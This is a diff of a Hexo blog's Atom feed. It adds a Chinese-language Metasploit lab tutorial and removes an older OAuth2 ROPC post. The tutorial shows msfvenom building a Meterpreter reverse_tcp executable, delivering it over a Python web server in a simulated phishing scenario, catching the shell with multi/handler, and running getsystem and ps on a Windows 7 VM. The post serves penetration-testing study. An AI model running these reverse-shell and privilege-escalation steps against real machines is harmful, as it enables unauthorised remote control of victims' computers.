@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rainmakerho.github.io/"/>
-  <updated>2022-06-21T05:51:06.529Z</updated>
+  <updated>2022-06-23T06:00:54.944Z</updated>
   <id>https://rainmakerho.github.io/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Metasploit Framework - 遠端控制 Windows 電腦</title>
+    <link href="https://rainmakerho.github.io/2022/06/23/metasploit-reverse-tcp/"/>
+    <id>https://rainmakerho.github.io/2022/06/23/metasploit-reverse-tcp/</id>
+    <published>2022-06-23T03:21:33.000Z</published>
+    <updated>2022-06-23T06:00:54.944Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Metasploit Framework 是一個功能強大的資安工具組，<br>它將許多工具以Module的方式整合在一起，<br>而不用到到處去找、去下載不同的工具來做滲透測試。<br>正式開始學習之前先來淺嘗一下 Metasploit Framework 的強大之處。<br>練習情境為受害者收到釣魚信去下載惡意檔案並執行，<br>導致受害者的電腦(Windows 7)受到控制。</p><h3 id="練習"><a href="#練習" class="headerlink" title="練習"></a>練習</h3><p>開始之前，先準備一台 Windows 7(ip為10.5.0.5) 為受害VM，Ubuntu(版本為 20.04.4, ip為10.5.0.7) 安裝 Metasploit Framework。</p><p>1.安裝 <strong>Metasploit Framework</strong><br>依 <a href="https://linuxways.net/ubuntu/how-to-install-metasploit-framework-on-ubuntu-20-04/" target="_blank" rel="noopener">How to Install Metasploit Framework on Ubuntu 20.04</a> 說明來安裝。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">sudo chmod 755 msfinstall</span><br><span class="line">sudo ./msfinstall</span><br><span class="line">sudo msfconsole</span><br></pre></td></tr></table></figure></p><p>初始DB 及 設定 Web Service 的帳號及密碼 完成後，<br>執行 <code>db_status</code> 檢查 DB 是否有正常連線到 postgresql。<br>沒問題則執行 <code>exit</code> 離開 msfconsole</p><ul><li>註: 如果沒有設定 DB ，可以執行 <code>sudo msfdb init</code> 來設定 DB</li><li>註: 如果要重新設定 DB ，可以執行 <code>sudo msfdb reinit</code> 來重設 DB</li><li>註: 如果 postgresql 沒有啟動，可以執行 <code>sudo service postgresql start</code></li></ul><p>2.建立 <strong>reverse_tcp</strong> 遠端控制執行檔<br>執行 <code>msfvenom</code> 來產生遠端控制執行檔，預設為 x86<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.5.0.7 -f exe -o ~/test.exe</span><br></pre></td></tr></table></figure></p><p>當使用者執行 <code>test.exe</code> 就會與 LHOST 建立連線</p><p>3.建立 <strong>http 網站</strong>來讓 Windows 7(ip為10.5.0.5) 下載<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></p><p>4.Windows 7(ip為10.5.0.5) 下載 <strong>test.exe</strong><br>Windows 7(ip為10.5.0.5) 開啟 IE 下載 test.exe<br><img src="/2022/06/23/metasploit-reverse-tcp/01.png" title="開啟 IE 下載 test.exe"></p><p>5.開啟 <strong>msfconsole</strong> 並設定 LHOST 及 RHOST<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">setg LHOST 10.5.0.7</span><br><span class="line">setg RHOST 10.5.0.5</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p>全域設定 LHOST 為 Ubuntu(ip為10.5.0.7)，RHOST 為 Windows 7(ip為10.5.0.5)，<br>所以使用各項 Module 時，預設會使用此設定</p><p>6.使用 <strong>exploit/multi/handler</strong> 模組來監聽<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure></p><p>7.payload 使用 <strong>windows/meterpreter/reverse_tcp</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></p><p>8.查看<strong>設定值</strong>是否完整<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/02.png" title="show options"><p>在 payload 設定值中 Required 為 true 的參數都已有設定值</p><p>9.啟動<strong>監聽</strong>，並執行 test.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p>並到 Windows 7 中執行 <code>test.exe</code><br><img src="/2022/06/23/metasploit-reverse-tcp/03.png" title="Meterpreter session opened"><br>這時，受害者電腦已與我們的Ubuntu 建立連線，<br>同時會進到了 meterpreter</p><p>10.執行 <code>getsystem</code> 來提升權限為 local administrator or SYSTEM<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/04.png" title="getsystem"><p>11.執行 <code>?</code> 來查看在 meterpreter 可以執行那些指令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/05.png" title="meterpreter core commands"><p>12.執行 <code>ps</code> 來顯示 Windows 7 中執行的 Processes<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/06.png" title="ps command"><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://linuxways.net/ubuntu/how-to-install-metasploit-framework-on-ubuntu-20-04/" target="_blank" rel="noopener">How to Install Metasploit Framework on Ubuntu 20.04</a><br><a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_tcp.md" target="_blank" rel="noopener">windows/meterpreter/reverse_tcp</a><br><a href="https://docs.rapid7.com/metasploit/meterpreter-getsystem/" target="_blank" rel="noopener">Meterpreter getsystem</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Metasploit Framework 是一個功能強大的資安工具組，&lt;br&gt;它將許多工具以Module的方式整合在一起，&lt;br&gt;而不用到到
+      
+    
+    </summary>
+    
+    
+      <category term="資安" scheme="https://rainmakerho.github.io/tags/%E8%B3%87%E5%AE%89/"/>
+    
+      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
+    
+      <category term="reverse_tcp" scheme="https://rainmakerho.github.io/tags/reverse-tcp/"/>
+    
+      <category term="msfvenom" scheme="https://rainmakerho.github.io/tags/msfvenom/"/>
+    
+      <category term="exploit/multi/handler" scheme="https://rainmakerho.github.io/tags/exploit-multi-handler/"/>
+    
+  </entry>
   
   <entry>
     <title>WSL Could not resolve host</title>
@@ -629,35 +660,6 @@
       <category term="ContentType" scheme="https://rainmakerho.github.io/tags/ContentType/"/>
     
       <category term="Download" scheme="https://rainmakerho.github.io/tags/Download/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>OAuth 2.0 - Resource Owner Password Credentials (ROPC)</title>
-    <link href="https://rainmakerho.github.io/2022/03/03/oauth2-ropc/"/>
-    <id>https://rainmakerho.github.io/2022/03/03/oauth2-ropc/</id>
-    <published>2022-03-03T04:38:44.000Z</published>
-    <updated>2022-03-03T06:01:32.892Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在一些比較舊或是獨立的系統，常常會使用到 Resource Owner Password Credentials (ROPC) 的方式來取得 access token。<br>就是使用者在 Client Application 功能輸入帳/密後，再由 Client Application 將使用者的帳/密 Post 到 Authorization Server 來取回 access token。<br>這樣帳/密不就被 Client Application 取得了嗎!!!</p><h3 id="OAuth-2-0-Resource-Owner-Password-Credentials-ROPC"><a href="#OAuth-2-0-Resource-Owner-Password-Credentials-ROPC" class="headerlink" title="OAuth 2.0 - Resource Owner Password Credentials (ROPC)"></a>OAuth 2.0 - Resource Owner Password Credentials (ROPC)</h3><p>以下以 IdentityServer4 的方式來說明<br>1.在 IdentityServer4 中註冊使用 ROPC 的 Client<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Client</span><br><span class="line">&#123;</span><br><span class="line">    ClientId = <span class="string">"ropcclient"</span>,</span><br><span class="line">    ClientName = <span class="string">"Resource Owner Password Credentials (ROPC) OAuth Client"</span>,</span><br><span class="line">    AllowedScopes = &#123; <span class="string">"tid_api.full"</span>, <span class="string">"tid_api.read"</span> &#125;,</span><br><span class="line">    AllowedGrantTypes = GrantTypes.ResourceOwnerPassword,</span><br><span class="line">    ClientSecrets = &#123;</span><br><span class="line">        <span class="keyword">new</span> Secret(<span class="string">"ropcsecret"</span>.Sha256())</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2.Post 帳/密資訊給 IdentityServer 的 token ，grant_type 為 password ，取回 access token，並放在 localStorage 之中<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ropcUrl = <span class="string">`https://localhost:5001/connect/token`</span>;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: ropcUrl,</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        dataType: <span class="string">'json'</span>,</span><br><span class="line">        data: &#123;</span><br><span class="line">            client_id: <span class="string">'ropcclient'</span>,</span><br><span class="line">            client_secret: <span class="string">'ropcsecret'</span>,</span><br><span class="line">            scope: <span class="string">'tid_api.read'</span>,</span><br><span class="line">            grant_type: <span class="string">'password'</span>,</span><br><span class="line">            username: <span class="string">'bob'</span>,</span><br><span class="line">            password:<span class="string">'bob'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(data);</span><br><span class="line">            localStorage.setItem(<span class="string">"token_type"</span>, data.token_type);</span><br><span class="line">            localStorage.setItem(<span class="string">"access_token"</span>, data.access_token);</span><br><span class="line">            localStorage.setItem(<span class="string">"expires_in"</span>, data.expires_in);</span><br><span class="line">            localStorage.setItem(<span class="string">"expires_in"</span>, data.scope);</span><br><span class="line">            <span class="built_in">window</span>.location.reload();</span><br><span class="line">        &#125;,</span><br><span class="line">        failure: <span class="function"><span class="keyword">function</span> (<span class="params">errMsg</span>) </span>&#123;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p><img src="/2022/03/03/oauth2-ropc/01.png" title="POST token endpoint"><p>很簡潔的方式，但使用者的帳/密卻被 Client Application 知道，<br>建議改用 <a href="https://rainmakerho.github.io/2022/02/18/oAuth2-PKCE/">OAuth 2.0 - Proof Key for Code Exchange (PKCE)</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在一些比較舊或是獨立的系統，常常會使用到 Resource Owner Password Credentials (ROPC) 的方式來取得
-      
-    
-    </summary>
-    
-    
-      <category term="oauth2" scheme="https://rainmakerho.github.io/tags/oauth2/"/>
-    
-      <category term="ROPC" scheme="https://rainmakerho.github.io/tags/ROPC/"/>
-    
-      <category term="Resource Owner Password Credentials" scheme="https://rainmakerho.github.io/tags/Resource-Owner-Password-Credentials/"/>
-    
-      <category term="grant_type=password" scheme="https://rainmakerho.github.io/tags/grant-type-password/"/>
     
   </entry>
   
